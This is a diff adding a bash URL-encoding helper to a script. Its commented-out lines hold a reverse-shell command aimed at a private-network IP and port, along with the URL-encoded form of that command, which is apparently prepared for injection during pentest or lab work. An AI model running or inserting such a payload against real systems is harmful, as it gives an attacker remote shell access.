@@ -83,3 +83,24 @@ function separate () {
 function clean_line () {
     sed -i '/^#/d;/^$/d' $1
 }
+
+# Simple function to URL encode a data
+urlencode() {
+    local LC_ALL=C # support unicode: loop bytes, not characters
+    local c i n=${#1}
+    for (( i=0; i<n; i++ )); do
+        c="${1:i:1}"
+        case "$c" in
+            #' ') printf '+' ;; # HTML5 variant
+            [[:alnum:].~_-]) printf '%s' "$c" ;;
+            *) printf '%%%02X' "'$c" ;;
+        esac
+    done
+}
+
+#clear_url="bash -c 'bash -i >& /dev/tcp/192.168.49.61/9090 0>&1'"
+
+#encoded_url=$(urlencode "${clear_url}")
+
+#echo ${encoded_url}
+#bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.61%2F9090%200%3E%261%27
